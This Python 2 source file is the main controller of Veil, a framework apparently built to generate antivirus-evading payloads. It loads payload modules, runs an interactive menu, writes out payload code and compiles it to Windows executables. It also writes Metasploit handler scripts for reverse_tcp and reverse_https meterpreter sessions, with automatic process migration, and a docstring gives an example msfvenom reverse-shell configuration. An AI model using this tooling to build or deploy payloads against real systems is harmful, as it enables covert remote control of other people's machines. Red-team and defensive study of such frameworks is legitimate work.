"""
Contains the main controller object for Veil.

"""

# Import Modules
import glob
import imp
import sys
import os
import readline
import re
import socket
import commands
import time
import subprocess


# try to find and import the settings.py config file
if os.path.exists("/etc/veil/settings.py"):
    try:
        sys.path.append("/etc/veil/")
        import settings
    except ImportError:
        print "\n [!] ERROR: run ./config/update.py manually\n"
        sys.exit()
elif os.path.exists("./config/settings.py"):
    try:
        sys.path.append("./config")
        import settings
    except ImportError:
        print "\n [!] ERROR: run ./config/update.py manually\n"
        sys.exit()
else:
    # if the file isn't found, try to run the update script
    os.system('clear')
    print '========================================================================='
    print ' Veil First Run Detected... Initializing Script Setup...'
    print '========================================================================='
    # run the config if it hasn't been run
    print '\n [*] Executing ./config/update.py...'
    os.system('cd config && python update.py')

    # check for the config again and error out if it can't be found.
    if os.path.exists("/etc/veil/settings.py"):
        try:
            sys.path.append("/etc/veil/")
            import settings
        except ImportError:
            print "\n [!] ERROR: run ./config/update.py manually\n"
            sys.exit()
    elif os.path.exists("./config/settings.py"):
        try:
            sys.path.append("./config")
            import settings
        except ImportError:
            print "\n [!] ERROR: run ./config/update.py manually\n"
            sys.exit()
    else:
        print "\n [!] ERROR: run ./config/update.py manually\n"
        sys.exit()


from os.path import join, basename, splitext
from modules.common import messages
from modules.common import helpers
from modules.common import supportfiles
from modules.common import completers


class Controller:
    """
    Principal controller object that's instantiated.

    Loads all payload modules dynamically from ./modules/payloads/* and
    builds store the instantiated payload objects in self.payloads.
    has options to list languages/payloads, manually set payloads,
    generate code, and provides the main interactive
    menu that lists payloads and allows for user ineraction.
    """

    def __init__(self, langs = None, oneRun=True):
        self.payloads = list()
        # a specific payload, so we can set it manually
        self.payload = None
        # restrict loaded modules to specific languages
        self.langs = langs

        # oneRune signifies whether to only generate one payload, as we would
        # if being invoked from external code.
        # defaults to True, so Veil.py needs to manually specific "False" to
        # ensure an infinite loop
        self.oneRun = oneRun

        self.outputFileName = ""

        # "help":"print help screen",
        self.commands = { "use":"use a specific payload",
                 "info":"information on a specific payload",
                 "list":"list available payloads",
                 "update":"update Veil to the latest version",
                 "exit":"exit Veil"}

        self.payloadCommands = {"set":"set a specific option value",
                        "info":"show information about the payload",
                        "help [crypters]":"show help menu for payload or crypters",
                        "generate":"generate payload",
                        "back":"go to the main menu",
                        "exit":"exit Veil"}

        self.LoadPayloads()


    def LoadPayloads(self):
        """
        Crawl the module path and load up everything found into self.payloads.
        """
            
        # crawl up to 5 levels down the module path
        for x in xrange(1,5):    
            # make the folder structure the key for the module

            d = dict( (path[path.find("payloads")+9:-3], imp.load_source( "/".join(path.split("/")[3:])[:-3],path )  ) for path in glob.glob(join(settings.VEIL_PATH+"/modules/payloads/" + "*/" * x,'[!_]*.py')) )

            # instantiate the payload stager
            for name in d.keys():
                module = d[name].Payload()
                self.payloads.append( (name, module) )

        # sort payloads by their key/path name
        self.payloads = sorted(self.payloads, key=lambda x: (x[0]))


    def ListPayloads(self):
        """
        Prints out available payloads in a nicely formatted way.
        """

        print helpers.color(" [*] Available payloads:\n")
        lastBase = None
        x = 1
        for (name, payload) in self.payloads:
            parts = name.split("/")
            if lastBase and parts[0] != lastBase:
                print ""
            lastBase = parts[0]
            print "\t%s)\t%s" % (x, '{0: <24}'.format(name))
            x += 1
        print ""


    def UpdateVeil(self, interactive=True):
        """
        Updates Veil by invoking git pull on the OS 

        """
        print "\n Updating Veil via git...\n"
        updatecommand = ['git', 'pull']
        updater = subprocess.Popen(updatecommand, cwd=settings.VEIL_PATH, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        updoutput, upderr = updater.communicate()

        if interactive:
            raw_input(" [>] Veil updated, press any key to continue: ")


    def CleanPayloads(interactive=True):
        """
        Cleans out the payload source/compiled folders.
        """
        settings.PAYLOAD_SOURCE_PATH
        settings.PAYLOAD_COMPILED_PATH

        if interactive:
            choice = raw_input("\n [>] Are you sure you want to clean payload folderers? [y/N] ")

            if choice.lower() == "y":
                print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
                os.system('rm %s/*.*' %(settings.PAYLOAD_SOURCE_PATH))

                print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
                os.system('rm %s/*.exe' %(settings.PAYLOAD_COMPILED_PATH))

                choice = raw_input("\n [>] Folders cleaned, press any key to return to the main menu: ")
        
        else:
            print "\n [*] Cleaning %s" %(settings.PAYLOAD_SOURCE_PATH)
            os.system('rm %s/*.*' %(settings.PAYLOAD_SOURCE_PATH))

            print " [*] Cleaning %s" %(settings.PAYLOAD_COMPILED_PATH)
            os.system('rm %s/*.exe' %(settings.PAYLOAD_COMPILED_PATH))

            print "\n [*] Folders cleaned\n"


    def PayloadInfo(self, payload, showTitle=True, showInfo=True):
        """
        Print out information about a specified payload.

        payload = the payload object to print information on
        showTitle = whether to show the Veil title
        showInfo = whether to show the payload information bit

        """
        if showTitle:
            messages.title()

        if showInfo:
            # extract the payload class name from the instantiated object, then chop off the load folder prefix
            payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])

            print helpers.color(" Payload information:\n")
            print "\tName:\t\t" + payloadname
            print "\tLanguage:\t" + payload.language
            print "\tRating:\t\t" + payload.rating

            if hasattr(payload, 'shellcode'):
                if self.payload.shellcode.customshellcode:
                    print "\tShellcode:\t\tused"

            # format this all nice-like
            print helpers.formatLong("Description:", payload.description)

        # if required options were specified, output them
        if hasattr(self.payload, 'required_options'):
            print helpers.color("\n Required Options:\n")

            print " Name\t\t\tCurrent Value\tDescription"
            print " ----\t\t\t-------------\t-----------"

            # sort the dictionary by key before we output, so it looks nice
            for key in sorted(self.payload.required_options.iterkeys()):
                print " %s\t%s\t%s" % ('{0: <16}'.format(key), '{0: <8}'.format(payload.required_options[key][0]), payload.required_options[key][1])

            print ""


    def SetPayload(self, payloadname, options):
        """
        Manually set the payload for this object with specified options.

        name = the payload to set, ex: c/meter/rev_tcp
        options = dictionary of required options for the payload, ex:
                options['customShellcode'] = "\x00..."
                options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
                options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
        """

        # iterate through the set of loaded payloads, trying to find the specified payload name
        for (name, payload) in self.payloads:

            if payloadname.lower() == name.lower():

                # set the internal payload variable
                self.payload = payload

                # options['customShellcode'] = "\x00..."
                if 'customShellcode' in options:
                    self.payload.shellcode.setCustomShellcode(options['customShellcode'])
                # options['required_options'] = {"compile_to_exe" : ["Y", "Compile to an executable"], ...}
                if 'required_options' in options:
                    for k,v in options['required_options'].items():
                        self.payload.required_options[k] = v
                # options['msfvenom'] = ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]
                if 'msfvenom' in options:
                    self.payload.shellcode.SetPayload(options['msfvenom'])

        # if a payload isn't found, then list available payloads and exit
        if not self.payload:
            print helpers.color(" [!] Invalid payload selected\n\n", warning=True)
            self.ListPayloads()
            sys.exit()


    def ValidatePayload(self, payload):
        """
        Check if all required options are filled in.

        Returns True if valid, False otherwise.
        """

        # don't worry about shellcode - it validates itself


        # validate required options if present
        if hasattr(payload, 'required_options'):
            for key in sorted(self.payload.required_options.iterkeys()):
                if payload.required_options[key][0] == "":
                    return False

        return True


    def GeneratePayload(self):
        """
        Calls self.payload.generate() to generate payload code.

        Returns string of generated payload code.
        """
        return self.payload.generate()


    def OutputMenu(self, payload, code, showTitle=True, interactive=True, overwrite=False, OutputBaseChoice=""):
        """
        Write a chunk of payload code to a specified ouput file base.
        Also outputs a handler script if required from the options.

        code = the source code to write
        OutputBaseChoice = "payload" or user specified string

        Returns the full name the source was written to.
        """

        # if we get .exe code back, output to the compiled folder, otherwise write to the source folder
        if payload.extension == "exe":
            outputFolder = settings.PAYLOAD_COMPILED_PATH
        else:
            outputFolder = settings.PAYLOAD_SOURCE_PATH

        # only show get input if we're doing the interactive menu
        if interactive:
            if showTitle:
                messages.title()

            # Get the base install name for the payloads (i.e. OutputBaseChoice.py/OutputBaseChoice.exe)
            print " [*] Press [enter] for 'payload'"
            OutputBaseChoice = raw_input(" [>] Please enter the base name for output files: ")

        if OutputBaseChoice == "": OutputBaseChoice = "payload"

        # if we are overwriting, this is the base choice used
        FinalBaseChoice = OutputBaseChoice

        # if we're not overwriting output files, walk the existing and increment
        if not overwrite:
            # walk the output path and grab all the file bases, disregarding extensions
            fileBases = []
            for (dirpath, dirnames, filenames) in os.walk(outputFolder):
                fileBases.extend(list(set([x.split(".")[0] for x in filenames if x.split(".")[0] != ''])))
                break

            # as long as the file exists, increment a counter to add to the filename
            # i.e. "payload3.py", to make sure we don't overwrite anything
            FinalBaseChoice = OutputBaseChoice
            x = 1
            while FinalBaseChoice in fileBases:
                FinalBaseChoice = OutputBaseChoice + str(x)
                x += 1

        # set the output name to /outout/source/BASENAME.EXT
        OutputFileName = outputFolder + FinalBaseChoice + "." + payload.extension

        OutputFile = open(OutputFileName, 'w')
        OutputFile.write(code)
        OutputFile.close()

        # start building the information string for the generated payload
        # extract the payload class name from the instantiated object, then chop off the load folder prefix
        payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
        message = "\n Language:\t\t"+helpers.color(payload.language)+"\n Payload:\t\t"+payloadname

        if hasattr(payload, 'shellcode'):
            # check if msfvenom was used or something custom, print appropriately
            if payload.shellcode.customshellcode != "":
                message += "\n Shellcode:\t\tcustom"
            else:
                message += "\n Shellcode:\t\t" + payload.shellcode.msfvenompayload

                # if the shellcode wasn't custom, build out a handler script
                handler = "use exploit/multi/handler\n"
                handler += "set PAYLOAD " + payload.shellcode.msfvenompayload + "\n"
                handler += "set LHOST 0.0.0.0\n"
                
                # extract LPORT if it's there
                p = re.compile('LPORT=(.*?) ')
                parts = p.findall(payload.shellcode.msfvenomCommand)
                if len(parts) > 0:
                    handler += "set LPORT " + parts[0] + "\n"

                handler += "set ExitOnSession false\n"
                handler += "set AutoRunScript post/windows/manage/migrate\n"
                handler += "exploit -j\n"

            # print out any msfvenom options we used in shellcode generation if specified
            if len(payload.shellcode.options) > 0:
                message += "\n Options:\t\t"
                parts = ""
                for option in payload.shellcode.options:
                    parts += ' ' + option + ' '
                message += parts.strip()

            # reset the internal shellcode state the options don't persist
            payload.shellcode.Reset()

        # if required options were specified, output them
        if hasattr(payload, 'required_options'):
            message += "\n Required Options:\t"
            t = ""
            # sort the dictionary by key before we output, so it looks nice
            for key in sorted(payload.required_options.iterkeys()):
                t += " " + key + "=" + payload.required_options[key][0] + " "
            message += t.strip()

            # check if any options specify that we should build a handler out
            keys = payload.required_options.keys()

            if "LHOST" in keys:

                handler = "use exploit/multi/handler\n"
                # do our best to determine the payload type

                # handle options from the backdoor factory
                if "payload" in keys:
                    p = payload.required_options["payload"][0]
                    if "tcp" in p:
                        handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
                    elif "https" in p:
                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
                    elif "shell" in  p:
                        handler += "set PAYLOAD windows/shell_reverse_tcp\n"
                    else: pass

                # if not BDF, try to extract the handler type from the payload name
                else:
                    # extract the payload class name from the instantiated object, then chop off the load folder prefix
                    payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
                    if "tcp" in payloadname.lower():
                        handler += "set PAYLOAD windows/meterpreter/reverse_tcp\n"
                    elif "https" in payloadname.lower():
                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
                    elif "http" in payloadname.lower():
                        handler += "set PAYLOAD windows/meterpreter/reverse_https\n"
                    else: pass

                handler += "set LHOST 0.0.0.0\n"

                if "LPORT" in keys:
                    handler += "set LPORT " + payload.required_options["LPORT"][0] + "\n"

                handler += "set ExitOnSession false\n"
                handler += "set AutoRunScript post/windows/manage/migrate\n"
                handler += "exploit -j\n"


        message += "\n Payload File:\t\t"+OutputFileName + "\n"

        # if we're generating the handler script, write it out
        try:
            if settings.GENERATE_HANDLER_SCRIPT.lower() == "true":
                handlerFileName = settings.HANDLER_PATH + FinalBaseChoice + "_handler.rc"
                handlerFile = open(handlerFileName, 'w')
                handlerFile.write(handler)
                handlerFile.close()
                message += " Handler File:\t\t"+handlerFileName + "\n"
        except:
            # is that option fails, it probably means that the /etc/veil/settings.py file hasn't been updated
            print helpers.color("\n [!] Please run ./config/update.py !", warning=True)

        # print out notes if set
        if hasattr(payload, 'notes'):
            #message += " Notes:\t\t\t" + payload.notes
            message += helpers.formatLong("Notes:", payload.notes, frontTab=False, spacing=24)

        message += "\n"

        # check if compile_to_exe is in the required options, if so,
        # call supportfiles.supportingFiles() to compile appropriately
        if hasattr(self.payload, 'required_options'):
            if "compile_to_exe" in self.payload.required_options:
                value = self.payload.required_options['compile_to_exe'][0].lower()[0]
                if value == "y" or value==True:
                    if interactive:
                        supportfiles.supportingFiles(self.payload.language, OutputFileName, {})
                    else:
                        supportfiles.supportingFiles(self.payload.language, OutputFileName, {'method':'pyinstaller'})

                    # if we're compiling, set the returned file name to the output .exe
                    # so we can return this for external calls to the framework
                    OutputFileName = settings.PAYLOAD_COMPILED_PATH + FinalBaseChoice + ".exe"

        # print the full message containing generation notes
        print message

        # print the end message
        messages.endmsg()

        if interactive:
            raw_input(" [>] press any key to return to the main menu: ")
            #self.MainMenu(showMessage=True)

        return OutputFileName


    def PayloadMenu(self, payload, showTitle=True):
        """
        Main menu for interacting with a specific payload.

        payload = the payload object we're interacting with
        showTitle = whether to show the main Veil title menu

        Returns the output of OutputMenu() (the full path of the source file or compiled .exe)
        """

        comp = completers.PayloadCompleter(self.payload)
        readline.set_completer_delims(' \t\n;')
        readline.parse_and_bind("tab: complete")
        readline.set_completer(comp.complete)

        # show the title if specified
        if showTitle:
            messages.title()

        # extract the payload class name from the instantiated object
        # YES, I know this is a giant hack :(
        # basically need to find "payloads" in the path name, then build
        # everything as appropriate
        payloadname = "/".join(str(str(payload.__class__)[str(payload.__class__).find("payloads"):]).split(".")[0].split("/")[1:])
        print " Payload: " + helpers.color(payloadname) + " loaded\n"

        self.PayloadInfo(payload, showTitle=False, showInfo=False)
        messages.helpmsg(self.payloadCommands, showTitle=False)

        choice = ""
        while choice == "":

            while True:

                choice = raw_input(" [>] Please enter a command: ").strip()

                if choice != "":

                    parts = choice.strip().split()
                    # display help menu for the payload
                    if parts[0] == "info":
                        self.PayloadInfo(payload)
                        choice = ""
                    if parts[0] == "help":
                        if len(parts) > 1:
                            if parts[1] == "crypters" or parts[1] == "[crypters]":
                                messages.helpCrypters()
                        else:
                            messages.helpmsg(self.payloadCommands)
                        choice = ""
                    # head back to the main menu
                    if parts[0] == "main" or parts[0] == "back":
                        #finished = True
                        return ""
                        #self.MainMenu()
                    if parts[0] == "exit":
                        raise KeyboardInterrupt

                    # Update Veil via git
                    if parts[0] == "update":
                        self.UpdateVeil()

                    # set specific options
                    if parts[0] == "set":

                        # catch the case of no value being supplied
                        if len(parts) == 1:
                            print helpers.color(" [!] ERROR: no value supplied\n", warning=True)

                        else:

                            option = parts[1]
                            value = "".join(parts[2:])

                            #### VALIDATION ####

                            # validate LHOST
                            if option == "LHOST":
                                hostParts = value.split(".")

                                if len(hostParts) > 1:

                                    # if the last chunk is a number, assume it's an IP address
                                    if hostParts[-1].isdigit():
                                        # do a regex IP validation
                                        if not re.match(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$",value):
                                            print helpers.color("\n [!] ERROR: Bad IP address specified.\n", warning=True)
                                        else:
                                            try:
                                                payload.required_options[option][0] = value
                                            except KeyError:
                                                print helpers.color("\n [!] ERROR: Specify LHOST value in the following screen.\n", warning=True)
                                            except AttributeError:
                                                print helpers.color("\n [!] ERROR: Specify LHOST value in the following screen.\n", warning=True)

                                    # assume we've been passed a domain name
                                    else:
                                        if helpers.isValidHostname(value):
                                            pass
                                        else:
                                            print helpers.color("\n [!] ERROR: Bad hostname specified.\n", warning=True)

                                else:
                                    print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)

                            # validate LPORT
                            elif option  == "LPORT":
                                try:
                                    if int(value) <= 0 or int(value) >= 65535:
                                        print helpers.color("\n [!] ERROR: Bad port number specified.\n", warning=True)
                                    else:
                                        try:
                                            payload.required_options[option][0] = value
                                        except KeyError:
                                            print helpers.color("\n [!] ERROR: Specify LPORT value in the following screen.\n", warning=True)
                                        except AttributeError:
                                            print helpers.color("\n [!] ERROR: Specify LPORT value in the following screen.\n", warning=True)
                                except ValueError:
                                    print helpers.color("\n [!] ERROR: Bad port number specified.\n", warning=True)

                            # set the specific option value if not validation done
                            else:
                                try:
                                    payload.required_options[option][0] = value
                                except:
                                    print helpers.color(" [!] ERROR: Invalid value specified.\n", warning=True)
                                    cmd = ""

                    # generate the payload
                    if parts[0] == "generate":

                        # make sure all required options are filled in first
                        if self.ValidatePayload(payload):

                            #finished = True
                            # actually generate the payload code
                            payloadCode = payload.generate()

                            # ensure we got some code back
                            if payloadCode != "":
                                # call the output menu
                                return self.OutputMenu(payload, payloadCode)

                        else:
                            print helpers.color("\n [!] WARNING: not all required options filled\n", warning=True)


    def MainMenu(self, showMessage=True):
        """
        Main interactive menu for payload generation.

        showMessage = reset the screen and show the greeting message [default=True]
        oneRun = only run generation once, returning the path to the compiled executable
        	used when invoking the framework from an external source
        """

        self.outputFileName = ""
        cmd = ""

        try:
            while cmd == "" and self.outputFileName == "":

                # set out tab completion for the appropriate modules on each run
                # as other modules sometimes reset this
                comp = completers.MainMenuCompleter(self.commands, self.payloads)
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind("tab: complete")
                readline.set_completer(comp.complete)

                if showMessage:
                    # print the title, where we are, and number of payloads loaded
                    messages.title()
                    print " Main Menu\n"
                    print "\t" + helpers.color(str(len(self.payloads))) + " payloads loaded\n"
                    messages.helpmsg(self.commands, showTitle=False)

                cmd = raw_input(' [>] Please enter a command: ').strip()

                # handle our tab completed commands
                if cmd.startswith("help"):
                    #messages.helpmsg(self.commands)
                    messages.title()
                    self.commands
                    cmd = ""
                    showMessage=False

                elif cmd.startswith("use"):

                    if len(cmd.split()) == 1:
                        messages.title()
                        self.ListPayloads()
                        showMessage=False
                        cmd = ""

                    elif len(cmd.split()) == 2:

                        # pull out the payload/number to use
                        p = cmd.split()[1]

                        # if we're choosing the payload by numbers
                        if p.isdigit() and 0 < int(p) <= len(self.payloads):
                            x = 1
                            for (name, pay) in self.payloads:
                                # if the entered number matches the payload #, use that payload
                                if int(p) == x:
                                    self.payload = pay
                                    self.outputFileName = self.PayloadMenu(self.payload)
                                x += 1

                        # else choosing the payload by name
                        else:
                            for (payloadName, pay) in self.payloads:
                                # if we find the payload specified, kick off the payload menu
                                if payloadName == p:
                                    self.payload = pay
                                    self.outputFileName = self.PayloadMenu(self.payload)                                        

                        cmd = ""
                        showMessage=True

                    # error catchings if not of form [use BLAH]
                    else:
                        cmd = ""
                        showMessage=False

                elif cmd.startswith("update"):
                    self.UpdateVeil()
                    showMessage=True
                    cmd = ""

                # clean payload folders
                if cmd.startswith("clean"):
                    self.CleanPayloads()
                    showMessage=True
                    cmd = ""

                elif cmd.startswith("info"):

                    if len(cmd.split()) == 1:
                        showMessage=True
                        cmd = ""

                    elif len(cmd.split()) == 2:

                        # pull out the payload/number to use
                        p = cmd.split()[1]

                        # if we're choosing the payload by numbers
                        if p.isdigit() and 0 < int(p) <= len(self.payloads):
                            x = 1
                            for (name, pay) in self.payloads:
                                # if the entered number matches the payload #, use that payload
                                if int(p) == x:
                                    self.payload = pay
                                    self.PayloadInfo(self.payload)
                                x += 1

                        # else choosing the payload by name
                        else:
                            for (payloadName, pay) in self.payloads:
                                # if we find the payload specified, kick off the payload menu
                                if payloadName == p:
                                    self.payload = pay
                                    self.PayloadInfo(self.payload) 

                        cmd = ""
                        showMessage=False

                    # error catchings if not of form [use BLAH]
                    else:
                        cmd = ""
                        showMessage=False

                elif cmd.startswith("list"):

                    if len(cmd.split()) == 1:
                        messages.title()
                        self.ListPayloads()     

                    cmd = ""
                    showMessage=False

                elif cmd.startswith("exit") or cmd.startswith("q"):
                    if self.oneRun:
                        # if we're being invoked from external code, just return
                        # an empty string on an exit/quit instead of killing everything
                        return ""
                    else:
                        print helpers.color("\n [!] Exiting...\n", warning=True)
                        sys.exit()

                # select a payload by just the number
                elif cmd.isdigit() and 0 < int(cmd) <= len(self.payloads):
                    x = 1
                    for (name, pay) in self.payloads:
                        # if the entered number matches the payload #, use that payload
                        if int(cmd) == x:
                            self.payload = pay
                            self.outputFileName = self.PayloadMenu(self.payload)
                        x += 1
                    cmd = ""
                    showMessage=True

                # if nothing is entered
                else:
                    cmd = ""
                    showMessage=True

                # if we're looping forever on the main menu (Veil.py behsvior)
                # reset the output filname to nothing so we don't break the while
                if not self.oneRun:
                    self.outputFileName = ""

            return self.outputFileName

        # catch any ctrl + c interrupts
        except KeyboardInterrupt:
            if self.oneRun:
                # if we're being invoked from external code, just return
                # an empty string on an exit/quit instead of killing everything
                return ""
            else:
                print helpers.color("\n\n [!] Exiting...\n", warning=True)
                sys.exit()
